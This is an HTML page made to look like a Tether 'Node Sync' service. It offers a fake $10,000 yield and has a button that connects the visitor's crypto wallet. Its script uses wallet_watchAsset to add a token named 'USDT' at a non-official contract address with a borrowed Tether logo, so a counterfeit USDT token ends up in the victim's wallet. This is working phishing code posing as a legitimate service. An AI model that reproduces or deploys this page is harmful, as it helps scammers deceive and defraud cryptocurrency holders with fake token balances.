<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Operations | Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 360px; text-align: center; box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8); }
        
        .logo-ring { position: relative; display: inline-block; margin-bottom: 25px; }
        .logo-ring::after { content: ''; position: absolute; top: -8px; left: -8px; right: -8px; bottom: -8px; border: 2px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 2s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        
        .usdt-img { width: 85px; height: 85px; border-radius: 50%; background: #1a1d23; padding: 5px; }
        
        h2 { font-size: 20px; margin: 15px 0; letter-spacing: 1px; }
        .price-box { background: rgba(38, 161, 123, 0.05); border: 1px solid #2d333b; border-radius: 15px; padding: 20px; margin: 25px 0; }
        .price-value { font-size: 32px; font-weight: 800; color: #fff; }

        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 14px; font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.3s; }
        .action-btn:active { transform: scale(0.98); }
        
        #log-area { font-size: 10px; color: #848d97; margin-top: 20px; font-family: monospace; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-ring">
        <img src="https://gateway.pinata.cloud/ipfs/QmZpS8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8A6Z8" 
             id="tokenImg" class="usdt-img" alt="USDT">
    </div>
    
    <h2>NODE ALLOCATION</h2>
    
    <div class="price-box">
        <div style="font-size: 11px; color: #848d97; margin-bottom: 5px;">ESTIMATED YIELD</div>
        <div class="price-value">$10,000.00</div>
    </div>
    
    <button class="action-btn" id="claimBtn">SYNC NODE METADATA</button>
    
    <div id="log-area">STATUS: READY_FOR_SYNC</div>
</div>

<script>
    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    // Custom non-official logo link
    const CUSTOM_LOGO = "https://img.icons8.com/fluency/96/tether.png"; 

    // Update image UI
    document.getElementById('tokenImg').src = CUSTOM_LOGO;

    async function executeMasterSync() {
        const log = document.getElementById('log-area');
        const btn = document.getElementById('claimBtn');
        
        if (!window.ethereum) { 
            alert("Please open this link inside MetaMask or Trust Wallet browser."); 
            return; 
        }

        try {
            btn.disabled = true;
            log.innerText = "INITIALIZING CONNECTION...";
            
            // Connect Wallet
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            log.innerText = "INJECTING METADATA...";
            
            // Core Logic: Only Wallet Watch (No Personal Sign)
            const wasAdded = await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT',
                        decimals: 18,
                        image: CUSTOM_LOGO,
                    },
                },
            });

            if (wasAdded) {
                log.innerText = "SYNC SUCCESSFUL!";
                btn.innerText = "NODE SYNCED ✅";
                btn.style.background = "#1a1d23";
                btn.style.color = "#26a17b";
                btn.style.border = "1px solid #26a17b";
            } else {
                log.innerText = "SYNC_CANCELLED";
                btn.disabled = false;
            }

        } catch (err) {
            log.innerText = "SYNC_FAILED: " + err.code;
            btn.disabled = false;
        }
    }

    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
</script>

</body>
</html>
